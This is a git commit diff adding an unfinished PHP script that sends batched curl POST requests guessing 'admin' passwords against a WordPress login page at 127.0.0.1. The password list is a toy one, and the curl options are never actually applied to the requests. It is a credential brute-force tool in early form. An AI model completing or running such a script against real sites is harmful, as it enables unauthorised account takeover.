a4bb5c4b4c6689a775f099c25ea93e77130ee496
Philip Whisenhunt <philip.whisenhunt@gmail.com>
2019-04-15 13:46:12 -0400

    Checking in progress, currently overwriting the ch1

---
+++ makePasswordArray.php
@@ -0,0 +1,6 @@
+<?php
+require 'queueUp.php';
+
+$array_of_passwords = ['1', '2', '3', 'four'];
+
+queueUp($array_of_passwords);
--- queueUp.php
+++ queueUp.php
@@ -1,11 +1,69 @@
 <?php
-$url = 'http://127.0.0.1:8888/wp-login.php';
 
+function queueUp($array_of_passwords) {
+    //create the curl handle
+    $mh = curl_multi_init();
+
+    $user_agent='Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0';
+
+
+    // Pick a url
+    $url = 'http://127.0.0.1:8888/wp-login.php';
+    $username = 'admin';
+    $redirect = './wp-admin/';
+
+    foreach($array_of_passwords as $password){
+        echo "The password is $password";
+        $ch1 = curl_init($url);
+        $options = array(
+
+            CURLOPT_CUSTOMREQUEST  =>"POST",        //set request type post or get
+            CURLOPT_POST           => true,        //set to POST
+            CURLOPT_USERAGENT      => $user_agent, //set user agent
+            CURLOPT_COOKIEFILE     =>"cookie.txt", //set cookie file
+            CURLOPT_COOKIEJAR      =>"cookie.txt", //set cookie jar
+            CURLOPT_RETURNTRANSFER => true,     // return web page
+            CURLOPT_HEADER         => false,    // don't return headers
+            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
+            CURLOPT_ENCODING       => "",       // handle all encodings
+            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
+            CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
+            CURLOPT_TIMEOUT        => 120,      // timeout on response
+            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
+            //CURLOPT_USERPWD        => $username . ":" . $password
+            //CURLOPT_POSTFIELDS     => array("log"=>$username, "pwd"=>$password),
+
+            //sets log and pwd, and includes the redirect to get through the hurdles to login to wordpress. Puts everything in the post fields.
+            CURLOPT_POSTFIELDS =>'log='.urlencode($username).'&pwd='.urlencode($password).'&redirect_to='.urlencode($redirect)
+        );
+        
+        //now add it to the group
+        curl_multi_add_handle($mh, $ch1);
+
+
+    }
+
+    do{
+        //multi_exec is the part that is returning something 
+        $content = curl_multi_exec($mh, $active);
+        if($active){
+            curl_multi_select($mh);
+        }
+    } while ($active);
+
+    curl_multi_remove_handle($mh, $ch1);
+    // curl_multi_remove_handle($mh, $ch2);
+    curl_multi_close($mh);
+
+}
+
+
+
+/*
 $ch1 = curl_init($url);
 $ch2 = curl_init($url);
 
-//create the curl handle
-$mh = curl_multi_init();
+
 
 //add the handles
 curl_multi_add_handle($mh, $ch1);
@@ -36,3 +94,4 @@ for each thing in that array, go through the process of initalizing the curl req
 Then, do a multi_curl request to 127.0.0.1
 
 */
+
